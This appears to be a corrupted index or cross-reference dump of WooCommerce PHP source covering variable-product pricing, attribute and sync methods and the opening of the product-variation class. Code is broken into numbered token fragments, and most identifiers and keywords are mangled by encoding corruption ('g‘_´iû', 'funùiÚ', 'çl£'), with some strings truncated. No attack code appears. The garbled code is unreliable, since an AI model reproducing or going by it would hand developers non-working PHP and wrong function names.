$mš_Ü_max
, 
$di¥Ïy
 );

257 
public
 
funùiÚ
 
g‘_´iû_html
Ğ
$´iû
 = '' ) {

260 iàĞ
$this
->
g‘_v¬ŸtiÚ_»guÏr_´iû
Ğ'mš' ) ==ğ
çl£
 || $this->
g‘_v¬ŸtiÚ_´iû
Ğ'mš' ) ==ğçl£ || $this->g‘_v¬ŸtiÚ_´iûĞ'mš' ) ==ğ'' || $this->
g‘_´iû
() === '' ) {

261 
$this
->
v¬ŸbË_´oduù_sync
Ğ$this->
id
 );

265 iàĞ
	g$this
->
g‘_´iû
() === '' ) {

267 
$´iû
 = 
­¶y_f‹rs
Ğ'woocomm”û_v¬ŸbË_em±y_´iû_html', '', 
$this
 );

272 
	g$´iûs
 = 
¬¿y
Ğ
$this
->
g‘_v¬ŸtiÚ_´iû
Ğ'mš', 
Œue
 ), $this->get_variation_price( 'max',rue ) );

273 
	g$´iû
 = 
$´iûs
[0] !=ğ$´iûs[1] ? 
¥rštf
Ğ
_x
Ğ'%1$s&ndash;%2$s', 'Priû„ªge: from-to', 'woocomm”û' ), 
wc_´iû
( $prices[0] ), wc_price( $prices[1] ) ) : wc_price( $prices[0] );

276 
	g$´iûs
 = 
¬¿y
Ğ
$this
->
g‘_v¬ŸtiÚ_»guÏr_´iû
Ğ'mš', 
Œue
 ), $this->get_variation_regular_price( 'max',rue ) );

277 
sÜt
Ğ
$´iûs
 );

278 
	g$§Ë´iû
 = 
$´iûs
[0] !=ğ$´iûs[1] ? 
¥rštf
Ğ
_x
Ğ'%1$s&ndash;%2$s', 'Priû„ªge: from-to', 'woocomm”û' ), 
wc_´iû
( $prices[0] ), wc_price( $prices[1] ) ) : wc_price( $prices[0] );

280 iàĞ
	g$´iû
 !=ğ
$§Ë´iû
 ) {

281 
$´iû
 = 
­¶y_f‹rs
Ğ'woocomm”û_v¬ŸbË_§Ë_´iû_html', 
$this
->
g‘_´iû_html_äom_to
Ğ
$§Ë´iû
, $´iû ) . $this->
g‘_´iû_suffix
(), $this );

283 
	g$´iû
 = 
­¶y_f‹rs
Ğ'woocomm”û_v¬ŸbË_´iû_html', 
$´iû
 . 
$this
->
g‘_´iû_suffix
(), $this );

288  
­¶y_f‹rs
Ğ'woocomm”û_g‘_´iû_html', 
$´iû
, 
$this
 );

298 
public
 
funùiÚ
 
	$g‘_v¬ŸtiÚ_©Œibu‹s
() {

300 
$v¬ŸtiÚ_©Œibu‹s
 = 
	`¬¿y
();

302 iàĞ! 
$this
->
	`has_chd
() )

303  
$v¬ŸtiÚ_©Œibu‹s
;

305 
$©Œibu‹s
 = 
$this
->
	`g‘_©Œibu‹s
();

307 
	`fÜ—ch
 ( 
$©Œibu‹s
 
as
 
$©Œibu‹
 ) {

308 iàĞ! 
$©Œibu‹
['is_variation'] )

311 
$v®ues
 = 
	`¬¿y
();

312 
$©Œibu‹_f›ld_Çme
 = '©Œibu‹_' . 
	`§n™ize_t™Ë
Ğ
$©Œibu‹
['name'] );

314 
	`fÜ—ch
 ( 
$this
->
	`g‘_chd»n
(è
as
 
$chd_id
 ) {

316 
$v¬ŸtiÚ
 = 
$this
->
	`g‘_chd
Ğ
$chd_id
 );

318 iàĞ! 
	`em±y
Ğ
$v¬ŸtiÚ
->
v¬ŸtiÚ_id
 ) ) {

320 iàĞ! 
$v¬ŸtiÚ
->
	`v¬ŸtiÚ_is_visibË
() )

323 
$chd_v¬ŸtiÚ_©Œibu‹s
 = 
$v¬ŸtiÚ
->
	`g‘_v¬ŸtiÚ_©Œibu‹s
();

325 
	`fÜ—ch
 ( 
$chd_v¬ŸtiÚ_©Œibu‹s
 
as
 
$Çme
 => 
$v®ue
 )

326 iàĞ
$Çme
 =ğ
$©Œibu‹_f›ld_Çme
 )

327 
$v®ues
[] = 
	`§n™ize_t™Ë
Ğ
$v®ue
 );

332 iàĞ
	`š_¬¿y
Ğ'', 
$v®ues
 ) ) {

334 
$v®ues
 = 
	`¬¿y
();

337 iàĞ
$©Œibu‹
['is_taxonomy'] ) {

338 
$po¡_‹rms
 = 
	`wp_g‘_po¡_‹rms
Ğ
$this
->
id
, 
$©Œibu‹
['name'] );

339 
	`fÜ—ch
 ( 
$po¡_‹rms
 
as
 
$‹rm
 )

340 
$v®ues
[] = 
$‹rm
->
¦ug
;

342 
$v®ues
 = 
	`¬¿y_m­
Ğ'Œim', 
	`ex¶ode
Ğ
WC_DELIMITER
, 
$©Œibu‹
['value'] ) );

345 
$v®ues
 = 
	`¬¿y_unique
( $values );

348 } 
	`–£if
 ( ! 
$©Œibu‹
['is_taxonomy'] ) {

350 
$İtiÚ_Çmes
 = 
	`¬¿y_m­
Ğ'Œim', 
	`ex¶ode
Ğ
WC_DELIMITER
, 
$©Œibu‹
['value'] ) );

351 
$İtiÚ_¦ugs
 = 
$v®ues
;

352 
$v®ues
 = 
	`¬¿y
();

354 
	`fÜ—ch
 ( 
$İtiÚ_Çmes
 
as
 
$İtiÚ_Çme
 ) {

355 iàĞ
	`š_¬¿y
Ğ
	`§n™ize_t™Ë
Ğ
$İtiÚ_Çme
 ), 
$İtiÚ_¦ugs
 ) )

356 
$v®ues
[] = 
$İtiÚ_Çme
;

360 
$v¬ŸtiÚ_©Œibu‹s
[ 
$©Œibu‹
['Çme'] ] = 
	`¬¿y_unique
Ğ
$v®ues
 );

363  
$v¬ŸtiÚ_©Œibu‹s
;

364 
	}
}

372 
public
 
funùiÚ
 
	$g‘_v¬ŸtiÚ_deçuÉ_©Œibu‹s
() {

374 
$deçuÉ
 = 
	`is£t
Ğ
$this
->
deçuÉ_©Œibu‹s
 ) ? $this->default_attributes : '';

376  
	`­¶y_f‹rs
Ğ'woocomm”û_´oduù_deçuÉ_©Œibu‹s', (
¬¿y
è
	`maybe_un£rŸlize
Ğ
$deçuÉ
 ), 
$this
 );

377 
	}
}

385 
public
 
funùiÚ
 
	$g‘_avaabË_v¬ŸtiÚs
() {

387 
$avaabË_v¬ŸtiÚs
 = 
	`¬¿y
();

389 
	`fÜ—ch
 ( 
$this
->
	`g‘_chd»n
(è
as
 
$chd_id
 ) {

391 
$v¬ŸtiÚ
 = 
$this
->
	`g‘_chd
Ğ
$chd_id
 );

393 iàĞ! 
	`em±y
Ğ
$v¬ŸtiÚ
->
v¬ŸtiÚ_id
 ) ) {

394 
$v¬ŸtiÚ_©Œibu‹s
 = 
$v¬ŸtiÚ
->
	`g‘_v¬ŸtiÚ_©Œibu‹s
();

395 
$avaab™y
 = 
$v¬ŸtiÚ
->
	`g‘_avaab™y
();

396 
$avaab™y_html
 = 
	`em±y
Ğ
$avaab™y
['avaab™y'] ) ? '' : 
	`­¶y_f‹rs
Ğ'woocomm”û_¡ock_html', '<°şass="¡ock ' . 
	`esc_©Œ
Ğ$avaab™y['şass'] ) . '">'. 
	`wp_k£s_po¡
( $availability['availability'] ).'</p>', wp_kses_post( $availability['availability'] ) );

398 iàĞ
	`has_po¡_thumbÇ
Ğ
$v¬ŸtiÚ
->
	`g‘_v¬ŸtiÚ_id
() ) ) {

399 
$©chm’t_id
 = 
	`g‘_po¡_thumbÇ_id
Ğ
$v¬ŸtiÚ
->
	`g‘_v¬ŸtiÚ_id
() );

401 
$©chm’t
 = 
	`wp_g‘_©chm’t_image_¤c
Ğ
$©chm’t_id
, 
	`­¶y_f‹rs
( 'single_product_large_thumbnail_size', 'shop_single' ) );

402 
$image
 = 
$©chm’t
 ? 
	`cu¼’t
( $attachment ) : '';

404 
$©chm’t
 = 
	`wp_g‘_©chm’t_image_¤c
Ğ
$©chm’t_id
, 'full' );

405 
$image_lšk
 = 
$©chm’t
 ? 
	`cu¼’t
( $attachment ) : '';

407 
$image_t™Ë
 = 
	`g‘_the_t™Ë
Ğ
$©chm’t_id
 );

408 
$image_®t
 = 
	`g‘_po¡_m‘a
Ğ
$©chm’t_id
, '_wp_©chm’t_image_®t', 
Œue
 );

410 
$image
 = 
$image_lšk
 = 
$image_t™Ë
 = 
$image_®t
 = '';

413 
$avaabË_v¬ŸtiÚs
[] = 
	`­¶y_f‹rs
Ğ'woocomm”û_avaabË_v¬ŸtiÚ', 
	`¬¿y
(

414 'v¬ŸtiÚ_id' => 
$chd_id
,

415 'v¬ŸtiÚ_is_visibË' => 
$v¬ŸtiÚ
->
	`v¬ŸtiÚ_is_visibË
(),

416 'is_purcha§bË' => 
$v¬ŸtiÚ
->
	`is_purcha§bË
(),

417 '©Œibu‹s' => 
$v¬ŸtiÚ_©Œibu‹s
,

418 'image_¤c' => 
$image
,

419 'image_lšk' => 
$image_lšk
,

420 'image_t™Ë' => 
$image_t™Ë
,

421 'image_®t' => 
$image_®t
,

422 '´iû_html' => 
$v¬ŸtiÚ
->
	`g‘_´iû
(è==ğ"" || 
$this
->
	`g‘_v¬ŸtiÚ_´iû
Ğ'mš' ) !=ğ$this->g‘_v¬ŸtiÚ_´iûĞ'max' ) ? '<¥ª cÏss="´iû">' . $v¬ŸtiÚ->
	`g‘_´iû_html
() . '</span>' : '',

423 'avaab™y_html' => 
$avaab™y_html
,

424 'sku' => 
$v¬ŸtiÚ
->
	`g‘_sku
(),

425 'weight' => 
$v¬ŸtiÚ
->
	`g‘_weight
(è. ' ' . 
	`esc_©Œ
Ğ
	`g‘_İtiÚ
('woocommerce_weight_unit' ) ),

426 'dim’siÚs' => 
$v¬ŸtiÚ
->
	`g‘_dim’siÚs
(),

428 'max_qty' => 
$this
->
	`backÜd”s_®lowed
(è? '' : 
$v¬ŸtiÚ
->
¡ock
,

429 'backÜd”s_®lowed' => 
$this
->
	`backÜd”s_®lowed
(),

430 'is_š_¡ock' => 
$v¬ŸtiÚ
->
	`is_š_¡ock
(),

431 'is_dowÆßdabË' => 
$v¬ŸtiÚ
->
	`is_dowÆßdabË
() ,

432 'is_vœtu®' => 
$v¬ŸtiÚ
->
	`is_vœtu®
(),

433 'is_sŞd_šdividu®ly' => 
$v¬ŸtiÚ
->
	`is_sŞd_šdividu®ly
() ? 'yes' : 'no',

434 ), 
$this
, 
$v¬ŸtiÚ
 );

438  
$avaabË_v¬ŸtiÚs
;

439 
	}
}

444 
public
 
funùiÚ
 
v¬ŸbË_´oduù_sync
Ğ
$´oduù_id
 = '' ) {

445 iàĞ
em±y
Ğ
$´oduù_id
 ) )

446 
$´oduù_id
 = 
$this
->
id
;

449 
	g£lf
::
sync
Ğ
$´oduù_id
 );

452 
	g$this
->
	g´iû
 = 
g‘_po¡_m‘a
Ğ
$´oduù_id
, '_´iû', 
Œue
 );

454 
fÜ—ch
 ( 
¬¿y
Ğ'´iû', '»guÏr_´iû', '§Ë_´iû' ) 
as
 
$´iû_ty³
 ) {

455 
	g$mš_v¬ŸtiÚ_id_key
 = "min_{$price_type}_variation_id";

456 
	g$max_v¬ŸtiÚ_id_key
 = "max_{$price_type}_variation_id";

457 
	g$mš_´iû_key
 = "_min_variation_{$price_type}";

458 
	g$max_´iû_key
 = "_max_variation_{$price_type}";

459 
	g$this
->
	g$mš_v¬ŸtiÚ_id_key
 = 
g‘_po¡_m‘a
Ğ
$´oduù_id
, '_' . 
$mš_v¬ŸtiÚ_id_key
, 
Œue
 );

460 
	g$this
->
	g$max_v¬ŸtiÚ_id_key
 = 
g‘_po¡_m‘a
Ğ
$´oduù_id
, '_' . 
$max_v¬ŸtiÚ_id_key
, 
Œue
 );

461 
	g$this
->
	g$mš_´iû_key
 = 
g‘_po¡_m‘a
Ğ
$´oduù_id
, '_' . 
$mš_´iû_key
, 
Œue
 );

462 
	g$this
->
	g$max_´iû_key
 = 
g‘_po¡_m‘a
Ğ
$´oduù_id
, '_' . 
$max_´iû_key
, 
Œue
 );

469 
public
 
funùiÚ
 
	$sync
Ğ
$´oduù_id
 ) {

470 
glob®
 
$wpdb
;

472 
$chd»n
 = 
	`g‘_po¡s
Ğ
	`¬¿y
(

473 'po¡_·»Á' => 
$´oduù_id
,

481 iàĞ! 
$chd»n
 && 
	`g‘_po¡_¡©us
Ğ
$´oduù_id
 ) == 'publish' ) {

482 
$wpdb
->
	`upd©e
Ğ$wpdb->
po¡s
, 
	`¬¿y
Ğ'po¡_¡©us' => 'd¿á' ),‡¼ayĞ'ID' => 
$´oduù_id
 ) );

484 iàĞ
	`is_admš
() ) {

485 
WC_Admš_M‘a_Boxes
::
	`add_”rÜ
Ğ
	`__
( 'This variable…roduct has‚o‡ctive variations so cannot be…ublished. Changing statuso draft.', 'woocommerce' ) );

491 
$mš_´iû
 = 
nuÎ
;

492 
$max_´iû
 = 
nuÎ
;

493 
$mš_´iû_id
 = 
nuÎ
;

494 
$max_´iû_id
 = 
nuÎ
;

497 
$mš_»guÏr_´iû
 = 
nuÎ
;

498 
$max_»guÏr_´iû
 = 
nuÎ
;

499 
$mš_»guÏr_´iû_id
 = 
nuÎ
;

500 
$max_»guÏr_´iû_id
 = 
nuÎ
;

503 
$mš_§Ë_´iû
 = 
nuÎ
;

504 
$max_§Ë_´iû
 = 
nuÎ
;

505 
$mš_§Ë_´iû_id
 = 
nuÎ
;

506 
$max_§Ë_´iû_id
 = 
nuÎ
;

508 
	`fÜ—ch
 ( 
	`¬¿y
Ğ'´iû', '»guÏr_´iû', '§Ë_´iû' ) 
as
 
$´iû_ty³
 ) {

509 
	`fÜ—ch
 ( 
$chd»n
 
as
 
$chd_id
 ) {

510 
$chd_´iû
 = 
	`g‘_po¡_m‘a
Ğ
$chd_id
, '_' . 
$´iû_ty³
, 
Œue
 );

513 iàĞ
$chd_´iû
 === '' ) {

518 iàĞ'yes' ==ğ
	`g‘_İtiÚ
( 'woocommerce_hide_out_of_stock_items' ) ) {

519 
$¡ock
 = 
	`g‘_po¡_m‘a
Ğ
$chd_id
, '_¡ock', 
Œue
 );

520 iàĞ
$¡ock
 !=ğ"" && $¡ock <ğ
	`g‘_İtiÚ
( 'woocommerce_notify_no_stock_amount' ) ) {

526 iàĞ
	`is_nuÎ
Ğ
$
{"mš_{$´iû_ty³}"} ) || 
$chd_´iû
 < ${"min_{$price_type}"} ) {

527 
$
{"mš_{$´iû_ty³}"} = 
$chd_´iû
;

528 
$
{"mš_{$´iû_ty³}_id"} = 
$chd_id
;

532 iàĞ
$chd_´iû
 > 
$
{"max_{$price_type}"} ) {

533 
$
{"max_{$´iû_ty³}"} = 
$chd_´iû
;

534 
$
{"max_{$´iû_ty³}_id"} = 
$chd_id
;

539 
	`upd©e_po¡_m‘a
Ğ
$´oduù_id
, '_mš_v¬ŸtiÚ_' . 
$´iû_ty³
, 
$
{"min_{$price_type}"} );

540 
	`upd©e_po¡_m‘a
Ğ
$´oduù_id
, '_max_v¬ŸtiÚ_' . 
$´iû_ty³
, 
$
{"max_{$price_type}"} );

543 
	`upd©e_po¡_m‘a
Ğ
$´oduù_id
, '_mš_' . 
$´iû_ty³
 . '_v¬ŸtiÚ_id', 
$
{"min_{$price_type}_id"} );

544 
	`upd©e_po¡_m‘a
Ğ
$´oduù_id
, '_max_' . 
$´iû_ty³
 . '_v¬ŸtiÚ_id', 
$
{"max_{$price_type}_id"} );

548 
	`upd©e_po¡_m‘a
Ğ
$´oduù_id
, '_´iû', 
$mš_´iû
 );

550 
	`do_aùiÚ
Ğ'woocomm”û_v¬ŸbË_´oduù_sync', 
$´oduù_id
, 
$chd»n
 );

552 
	`wc_d–‘e_´oduù_Œªs›Ás
Ğ
$´oduù_id
 );

554 
	}
}

	@includes/class-wc-product-variation.php

1 <?
php


3 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

16 şas 
	cWC_Produù_V¬ŸtiÚ
 
ex‹nds
 
	mWC_Produù
 {

19 
public
 
	m$v¬ŸtiÚ_id
;

22 
public
 
	m$·»Á
;

25 
public
 
	m$v¬ŸtiÚ_d©a
 = 
¬¿y
();

28 
public
 
	m$v¬ŸtiÚ_has_Ëngth
 = 
çl£
;

31 
public
 
	m$v¬ŸtiÚ_has_width
 = 
çl£
;

34 
public
 
	m$v¬ŸtiÚ_has_height
 = 
çl£
;

37 
public
 
	m$v¬ŸtiÚ_has_weight
 = 
çl£
;

40 
public
 
	m$v¬ŸtiÚ_has_¡ock
 = 
çl£
;

43 
public
 
	m$v¬ŸtiÚ_has_sku
 = 
çl£
;

46 
public
 
	m$v¬ŸtiÚ_shpšg_şass
 = 
çl£
;

49 
public
 
	m$v¬ŸtiÚ_shpšg_şass_id
 = 
çl£
;

52 
public
 
	m$v¬ŸtiÚ_has_x_şass
 = 
çl£
;

55 
public
 
	m$v¬ŸtiÚ_has_dowÆßdabË_fes
 = 
çl£
;

65 
public
 
funùiÚ
 
__cÚ¡ruù
Ğ
$v¬ŸtiÚ
, 
$¬gs
 = 
	$¬¿y
() ) {

67 
$this
->
´oduù_ty³
 = 'variation';

69 iàĞ
	`is_objeù
Ğ
$v¬ŸtiÚ
 ) ) {

70 
$this
->
v¬ŸtiÚ_id
 = 
	`absšt
Ğ
$v¬ŸtiÚ
->
ID
 );

72 
$this
->
v¬ŸtiÚ_id
 = 
	`absšt
Ğ
$v¬ŸtiÚ
 );

76 
$this
->
id
 = ! 
	`em±y
Ğ
$¬gs
['·»Á_id'] ) ? 
	`štv®
Ğ$¬gs['·»Á_id'] ) : 
	`wp_g‘_po¡_·»Á_id
Ğ$this->
v¬ŸtiÚ_id
 );

79 iàĞ
	`em±y
Ğ
$this
->
id
 ) )

83 
$this
->
·»Á
 = ! 
	`em±y
Ğ
$¬gs
['·»Á'] ) ? $¬gs['·»Á'] : 
	`g‘_´oduù
Ğ$this->
id
 );

84 
$this
->
po¡
 = ! 
	`em±y
Ğ$this->
·»Á
->po¡ ) ? $this->·»Á->po¡ : 
	`¬¿y
();

85 
$this
->
´oduù_cu¡om_f›lds
 = 
	`g‘_po¡_m‘a
Ğ$this->
v¬ŸtiÚ_id
 );

88 
	`fÜ—ch
 ( 
$this
->
´oduù_cu¡om_f›lds
 
as
 
$Çme
 => 
$v®ue
 ) {

89 iàĞ! 
	`¡r¡r
Ğ
$Çme
, 'attribute_' ) )

92 
$this
->
v¬ŸtiÚ_d©a
[ 
$Çme
 ] = 
	`§n™ize_t™Ë
Ğ
$v®ue
[0] );

96 iàĞ! 
	`em±y
Ğ
$this
->
´oduù_cu¡om_f›lds
['_sku'][0] ) ) {

97 
$this
->
v¬ŸtiÚ_has_sku
 = 
Œue
;

98 
$this
->
sku
 = $this->
´oduù_cu¡om_f›lds
['_sku'][0];

101 iàĞ! 
	`em±y
Ğ
$this
->
´oduù_cu¡om_f›lds
['_downloadable_files'][0] ) ) {

102 
$this
->
v¬ŸtiÚ_has_dowÆßdabË_fes
 = 
Œue
;

103 
$this
->
dowÆßdabË_fes
 = $this->
´oduù_cu¡om_f›lds
['_downloadable_files'][0];

106 iàĞ
	`is£t
Ğ
$this
->
´oduù_cu¡om_f›lds
['_¡ock'][0] ) && '' !=ğ$this->´oduù_cu¡om_f›lds['_¡ock'][0] && 'yes' ==ğ
	`g‘_İtiÚ
( 'woocommerce_manage_stock' ) ) {

107 
$this
->
v¬ŸtiÚ_has_¡ock
 = 
Œue
;

108 
$this
->
mªage_¡ock
 = 'yes';

109 
$this
->
¡ock
 = $this->
´oduù_cu¡om_f›lds
['_stock'][0];

112 iàĞ
	`is£t
Ğ
$this
->
´oduù_cu¡om_f›lds
['_weight'][0] ) && $this->product_custom_fields['_weight'][0] !== '' ) {

113 
$this
->
v¬ŸtiÚ_has_weight
 = 
Œue
;

114 
$this
->
weight
 = $this->
´oduù_cu¡om_f›lds
['_weight'][0];

117 iàĞ
	`is£t
Ğ
$this
->
´oduù_cu¡om_f›lds
['_length'][0] ) && $this->product_custom_fields['_length'][0] !== '' ) {

118 
$this
->
v¬ŸtiÚ_has_Ëngth
 = 
Œue
;

119 
$this
->
Ëngth
 = $this->
´oduù_cu¡om_f›lds
['_length'][0];

122 iàĞ
	`is£t
Ğ
$this
->
´oduù_cu¡om_f›lds
['_width'][0] ) && $this->product_custom_fields['_width'][0] !== '' ) {

123 
$this
->
v¬ŸtiÚ_has_width
 = 
Œue
;

124 
$this
->
width
 = $this->
´oduù_cu¡om_f›lds
['_width'][0];

127 iàĞ
	`is£t
Ğ
$this
->
´oduù_cu¡om_f›lds
['_height'][0] ) && $this->product_custom_fields['_height'][0] !== '' ) {

128 
$this
->
v¬ŸtiÚ_has_height
 = 
Œue
;

129 
$this
->
height
 = $this->
´oduù_cu¡om_f›lds
['_height'][0];

132 iàĞ
	`is£t
Ğ
$this
->
´oduù_cu¡om_f›lds
['_downloadable'][0] ) && $this->product_custom_fields['_downloadable'][0] == 'yes' ) {

133 
$this
->
dowÆßdabË
 = 'yes';

135 
$this
->
dowÆßdabË
 = 'no';

138 iàĞ
	`is£t
Ğ
$this
->
´oduù_cu¡om_f›lds
['_virtual'][0] ) && $this->product_custom_fields['_virtual'][0] == 'yes' ) {

139 
$this
->
vœtu®
 = 'yes';

141 
$this
->
vœtu®
 = 'no';

144 iàĞ
	`is£t
Ğ
$this
->
´oduù_cu¡om_f›lds
['_tax_class'][0] ) ) {

145 
$this
->
v¬ŸtiÚ_has_x_şass
 = 
Œue
;

146 
$this
->
x_şass
 = $this->
´oduù_cu¡om_f›lds
['_tax_class'][0];

149 iàĞ
	`is£t
Ğ
$this
->
´oduù_cu¡om_f›lds
['_sale_price_dates_from'][0] ) )

150 
$this
->
§Ë_´iû_d©es_äom
 = $this->
´oduù_cu¡om_f›lds
['_sale_price_dates_from'][0];

152 iàĞ
	`is£t
Ğ
$this
->
´oduù_cu¡om_f›lds
['_sale_price_dates_to'][0] ) )

153 
$this
->
§Ë_´iû_d©es_to
 = $this->
´oduù_cu¡om_f›lds
['_sale_price_dates_to'][0];

156 
$this
->
´iû
 = 
	`is£t
Ğ$this->
´oduù_cu¡om_f›lds
['_price'][0] ) ? $this->product_custom_fields['_price'][0] : '';

157 
$this
->
»guÏr_´iû
 = 
	`is£t
Ğ$this->
´oduù_cu¡om_f›lds
['_regular_price'][0] ) ? $this->product_custom_fields['_regular_price'][0] : '';

158 
$this
->
§Ë_´iû
 = 
	`is£t
Ğ$this->
´oduù_cu¡om_f›lds
['_sale_price'][0] ) ? $this->product_custom_fields['_sale_price'][0] : '';

161 iàĞ
$this
->
´iû
 !=ğ'' && $this->
»guÏr_´iû
 == '' ) {

162 
	`upd©e_po¡_m‘a
Ğ
$this
->
v¬ŸtiÚ_id
, '_»guÏr_´iû', $this->
´iû
 );

163 
$this
->
»guÏr_´iû
 = $this->
´iû
;

165 iàĞ
$this
->
§Ë_´iû
 !=ğ'' && $this->§Ë_´iû < $this->
»guÏr_´iû
 ) {

166 
	`upd©e_po¡_m‘a
Ğ
$this
->
v¬ŸtiÚ_id
, '_´iû', $this->
§Ë_´iû
 );

167 
$this
->
´iû
 = $this->
§Ë_´iû
;

171 
$this
->
tÙ®_¡ock
 = $this->
¡ock
;

180 
public
 
funùiÚ
 
	$exi¡s
() {

181  
	`em±y
Ğ
$this
->
id
 ) ? 
çl£
 : 
Œue
;

182 
	}
}

188 
public
 
funùiÚ
 
	$g‘_³rm®šk
() {

189  
	`add_qu”y_¬g
Ğ
$this
->
v¬ŸtiÚ_d©a
, 
	`g‘_³rm®šk
Ğ$this->
id
 ) );

190 
	}
}

198 
public
 
funùiÚ
 
	$add_to_ÿ¹_u¾
() {

199 
$u¾
 = 
$this
->
	`is_purcha§bË
(è&& $this->
	`is_š_¡ock
(è? 
	`»move_qu”y_¬g
Ğ'added-to-ÿ¹', 
	`add_qu”y_¬g
Ğ
	`¬¿y_m”ge
Ğ
	`¬¿y
Ğ'v¬ŸtiÚ_id' => $this->
v¬ŸtiÚ_id
, 'add-to-ÿ¹' => $this->
id
 ), $this->
v¬ŸtiÚ_d©a
 ) ) ) : 
	`g‘_³rm®šk
( $this->id );

201  
	`­¶y_f‹rs
Ğ'woocomm”û_´oduù_add_to_ÿ¹_u¾', 
$u¾
, 
$this
 );

202 
	}
}

210 
public
 
funùiÚ
 
	$add_to_ÿ¹_‹xt
() {

211 
$‹xt
 = 
$this
->
	`is_purcha§bË
(è&& $this->
	`is_š_¡ock
(è? 
	`__
( 'Addo cart', 'woocommerce' ) : __( 'Read More', 'woocommerce' );

213  
	`­¶y_f‹rs
Ğ'woocomm”û_´oduù_add_to_ÿ¹_‹xt', 
$‹xt
, 
$this
 );

214 
	}
}

221 
public
 
funùiÚ
 
	$v¬ŸtiÚ_is_visibË
() {

222 
$visibË
 = 
Œue
;

225 iàĞ
	`g‘_po¡_¡©us
Ğ
$this
->
v¬ŸtiÚ_id
 ) != 'publish' )

226 
$visibË
 = 
çl£
;

229 
	`–£if
 ( 
	`g‘_İtiÚ
('woocomm”û_hide_out_of_¡ock_™ems'è=ğ'yes' && ! 
$this
->
	`is_š_¡ock
() )

230 
$visibË
 = 
çl£
;

233 
	`–£if
 ( 
$this
->
	`g‘_´iû
() === "" )

234 
$visibË
 = 
çl£
;

236  
	`­¶y_f‹rs
Ğ'woocomm”û_v¬ŸtiÚ_is_visibË', 
$visibË
, 
$this
->
v¬ŸtiÚ_id
, $this->
id
 );

237 
	}
}

245 
public
 
funùiÚ
 
	$is_purcha§bË
() {

248 iàĞ
	`g‘_po¡_¡©us
Ğ
$this
->
v¬ŸtiÚ_id
 ) != 'publish' )

249 
$purcha§bË
 = 
çl£
;

252 
$purcha§bË
 = 
·»Á
::
	`is_purcha§bË
();

254  
$purcha§bË
;

255 
	}
}

263 
public
 
funùiÚ
 
	$·»Á_is_visibË
() {

264  
$this
->
	`is_visibË
();

265 
	}
}

272 
public
 
funùiÚ
 
	$g‘_v¬ŸtiÚ_id
() {

273  
	`absšt
Ğ
$this
->
v¬ŸtiÚ_id
 );

274 
	}
}

281 
public
 
funùiÚ
 
	$g‘_v¬ŸtiÚ_©Œibu‹s
() {

282  
$this
->
v¬ŸtiÚ_d©a
;

283 
	}
}

290 
public
 
funùiÚ
 
g‘_´iû_html
Ğ
$´iû
 = '' ) {

292 
$x_di¥Ïy_mode
 = 
g‘_İtiÚ
( 'woocommerce_tax_display_shop' );

293 
	g$di¥Ïy_´iû
 = 
$x_di¥Ïy_mode
 =ğ'šş' ? 
$this
->
g‘_´iû_šşudšg_x
(è: $this->
g‘_´iû_exşudšg_x
();

294 
	g$di¥Ïy_»guÏr_´iû
 = 
$x_di¥Ïy_mode
 =ğ'šş' ? 
$this
->
g‘_´iû_šşudšg_x
Ğ1, $this->
g‘_»guÏr_´iû
(èè: $this->
g‘_´iû_exşudšg_x
( 1, $this->get_regular_price() );

295 
	g$di¥Ïy_§Ë_´iû
 = 
$x_di¥Ïy_mode
 =ğ'šş' ? 
$this
->
g‘_´iû_šşudšg_x
Ğ1, $this->
g‘_§Ë_´iû
(èè: $this->
g‘_´iû_exşudšg_x
( 1, $this->get_sale_price() );

297 iàĞ
	g$this
->
g‘_´iû
() !== '' ) {

298 iàĞ
$this
->
is_Ú_§Ë
() ) {

300 
$´iû
 = '<d–>' . 
wc_´iû
Ğ
$di¥Ïy_»guÏr_´iû
 ) . '</d–> <šs>' . wc_´iûĞ
$di¥Ïy_§Ë_´iû
 ) . '</šs>' . 
$this
->
g‘_´iû_suffix
();

302 
	g$´iû
 = 
­¶y_f‹rs
Ğ'woocomm”û_v¬ŸtiÚ_§Ë_´iû_html', 
$´iû
, 
$this
 );

304 } 
–£if
 ( 
$this
->
g‘_´iû
() > 0 ) {

306 
	g$´iû
 = 
wc_´iû
Ğ
$di¥Ïy_´iû
 ) . 
$this
->
g‘_´iû_suffix
();

308 
	g$´iû
 = 
­¶y_f‹rs
Ğ'woocomm”û_v¬ŸtiÚ_´iû_html', 
$´iû
, 
$this
 );

312 
	g$´iû
 = 
__
( 'Free!', 'woocommerce' );

314 
	g$´iû
 = 
­¶y_f‹rs
Ğ'woocomm”û_v¬ŸtiÚ_ä“_´iû_html', 
$´iû
, 
$this
 );

318 
	g$´iû
 = 
­¶y_f‹rs
Ğ'woocomm”û_v¬ŸtiÚ_em±y_´iû_html', '', 
$this
 );

321  
­¶y_f‹rs
Ğ'woocomm”û_g‘_v¬ŸtiÚ_´iû_html', 
$´iû
, 
$this
 );

328 
public
 
funùiÚ
 
	$g‘_image_id
() {

329 iàĞ
$this
->
v¬ŸtiÚ_id
 && 
	`has_po¡_thumbÇ
( $this->variation_id ) ) {

330 
$image_id
 = 
	`g‘_po¡_thumbÇ_id
Ğ
$this
->
v¬ŸtiÚ_id
 );

331 } 
	`–£if
 ( 
	`has_po¡_thumbÇ
Ğ
$this
->
id
 ) ) {

332 
$image_id
 = 
	`g‘_po¡_thumbÇ_id
Ğ
$this
->
id
 );

333 } 
	`–£if
 ( ( 
$·»Á_id
 = 
	`wp_g‘_po¡_·»Á_id
Ğ
$this
->
id
 ) ) && 
	`has_po¡_thumbÇ
( $parent_id ) ) {

334 
$image_id
 = 
	`g‘_po¡_thumbÇ_id
Ğ
$·»Á_id
 );

336 
$image_id
 = 0;

338  
$image_id
;

339 
	}
}

348 
public
 
funùiÚ
 
g‘_image
Ğ
$size
 = 'shİ_thumbÇ', 
$©Œ
 = 
	$¬¿y
() ) {

349 iàĞ
$this
->
v¬ŸtiÚ_id
 && 
	`has_po¡_thumbÇ
( $this->variation_id ) ) {

350 
$image
 = 
	`g‘_the_po¡_thumbÇ
Ğ
$this
->
v¬ŸtiÚ_id
, 
$size
, 
$©Œ
 );

351 } 
	`–£if
 ( 
	`has_po¡_thumbÇ
Ğ
$this
->
id
 ) ) {

352 
$image
 = 
	`g‘_the_po¡_thumbÇ
Ğ
$this
->
id
, 
$size
, 
$©Œ
 );

353 } 
	`–£if
 ( ( 
$·»Á_id
 = 
	`wp_g‘_po¡_·»Á_id
Ğ
$this
->
id
 ) ) && 
	`has_po¡_thumbÇ
( $parent_id ) ) {

354 
$image
 = 
	`g‘_the_po¡_thumbÇ
